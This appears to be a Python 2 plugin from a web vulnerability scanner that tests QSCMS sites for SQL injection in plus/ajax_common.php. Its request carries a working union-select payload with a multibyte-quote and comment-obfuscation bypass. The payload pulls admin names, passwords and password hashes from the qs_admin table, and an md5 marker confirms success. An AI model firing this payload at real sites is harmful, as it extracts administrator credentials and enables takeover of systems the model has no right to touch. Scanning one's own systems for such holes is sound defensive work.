#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,group_concat%28admin_name,0x3a,pwd,0x3a,pwd_hash,md5(333)%29,3+from+qs_admin%23"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('310dcbbf4cce62f762a2aaa148d556bd')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:qscms_ajax_common_SqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:qscms_ajax_common_SqlInjectionScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
